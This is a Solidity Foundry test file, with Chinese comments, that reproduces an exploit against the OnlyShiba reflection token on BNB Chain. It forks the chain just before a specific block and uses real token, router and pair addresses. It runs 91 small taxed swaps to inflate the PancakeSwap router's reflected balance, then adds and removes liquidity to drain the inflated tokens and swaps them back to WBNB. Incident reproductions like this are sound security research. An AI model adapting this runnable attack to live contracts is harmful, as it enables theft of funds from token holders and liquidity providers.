pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IPancakeV3Pool {
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IToken {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract OnlyShibaAttackTest is Test {
    IToken public token;
    IUniswapV2Router02 public router;
    IToken public wbnb;
    IToken public pair;

    address public ONLYSHIBA  = 0x85D42EE4b0C691580647A9503fC7A54AE345E499;
    address public PANCAKESWAP_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public attacker = address(0xBAD5EED);
    address public PAIR = 0x63ae776e2647f428415148f8ed2e3d13AaC9d397;
    
    function setUp() public {
        // set block
        vm.createSelectFork("bsc", 39_389_059 - 1);

        token = IToken(ONLYSHIBA);
        router = IUniswapV2Router02(PANCAKESWAP_ROUTER);
        wbnb = IToken(WBNB);
        pair = IToken(PAIR);

        vm.deal(attacker, 1 ether);
        // deposit to WBNB
        vm.prank(attacker);
        (bool success, ) = WBNB.call{value: 1 ether}("");
        require(success, "WBNB deposit failed");
        // log
        console.log("Attacker initial BNB balance:", wbnb.balanceOf(attacker));
    }

    // // 场景 A：直接 Add/Remove 看看是否有效
    // function test_DirectRemoveLiquidity() public {
    //     vm.startPrank(attacker);
        
    //     console.log("=== Scenario: Direct Add/Remove ===");
    //     checkRouterBalance();

    //     // 1. 买入少量代币用于添加流动性
    //     buyToken(0.001 ether);
    //     uint256 bal = token.balanceOf(attacker);
        
    //     // 2. 添加流动性 with wbnb
    //     token.approve(address(router), bal);
    //     (,, uint256 lp) = router.addLiquidity(
    //         address(token), 
    //         WBNB, 
    //         bal, 
    //         0.001 ether, 
    //         0, 
    //         0, 
    //         attacker, 
    //         block.timestamp
    //     );

    //     // 3. 立即移除流动性
    //     router.removeLiquidityETHSupportingFeeOnTransferTokens(
    //         address(token), lp, 0, 0, attacker, block.timestamp
    //     );

    //     console.log("Final Attacker Token Balance:", token.balanceOf(attacker));
    //     vm.stopPrank();
    // }

    // 场景 B：复现 91 次 Swap 攻击路径
    function test_ExploitWith91Swaps() public {
        vm.startPrank(attacker);

        // approve
        token.approve(address(router), type(uint256).max);
        wbnb.approve(address(router), type(uint256).max);
        pair.approve(address(router), type(uint256).max);
        
        console.log("=== Scenario: 91 Swaps Attack ===");
        checkRouterBalance();

        // 1. 初始买入 (0.001 WBNB -> 279 OnlyShiba)
        buyToken(0.001 ether);
        uint256 initBal = token.balanceOf(attacker);
        console.log("Initial Attacker Token Balance:", initBal);

        // 2. 执行 91 次小额 Swap (每次 3e18)
        // 这些交易会收取 100% 税：40%销毁 rTotal, 40%入合约, 20%喂给 Router
        uint256 swapAmount = initBal / 91;
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = WBNB;
        for(uint i = 0; i < 91; i++) {
            // router swap token -> wbnb
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                swapAmount,
                0,
                path,
                attacker,
                block.timestamp
            );
        }
        
        console.log("After 91 swaps...");
        checkRouterBalance();

        // 3. 再次买入并添加流动性 (此时 Router 的反射余额已经因为分红和 20% 税变得巨大)
        buyToken(0.001 ether);
        uint256 balForLP = token.balanceOf(attacker);
        // log
        console.log("Attacker Token Balance before Adding Liquidity:", balForLP);

        token.approve(address(router), type(uint256).max);
        
        (,, uint256 lp) = router.addLiquidity(
            address(token), 
            WBNB, 
            balForLP, 
            0.001 ether, 
            0, 
            0, 
            attacker, 
            block.timestamp
        );

        // 4. 移除流动性：Router 会根据它巨大的余额分配代币
        router.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(token), lp, 0, 0, attacker, block.timestamp
        );

        uint256 finalBal = token.balanceOf(attacker);
        console.log("Final Attacker Token Balance:", finalBal);
        
        assertTrue(finalBal > 1000000 ether, "Attack Failed: Balance not inflated");

        // log final router balance
        checkRouterBalance();

        // swap back to WBNB
        address[] memory path2 = new address[](2);
        path2[0] = address(token);
        path2[1] = WBNB;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            finalBal,
            0,
            path2,
            attacker,
            block.timestamp
        );
        console.log("Final Attacker WBNB Balance:", wbnb.balanceOf(attacker));
        checkRouterBalance();
        vm.stopPrank();
    }

    // --- 辅助函数 ---
    
    function checkRouterBalance() internal view {
        uint256 rBal = token.balanceOf(PANCAKESWAP_ROUTER);
        console.log("Current Router Token Balance:", rBal);
    }

    function buyToken(uint256 wbnbAmount) internal {
        console.log("Buying Token with WBNB:", wbnbAmount);
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(token);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnbAmount,
            0,
            path,
            attacker,
            block.timestamp
        );
    }
}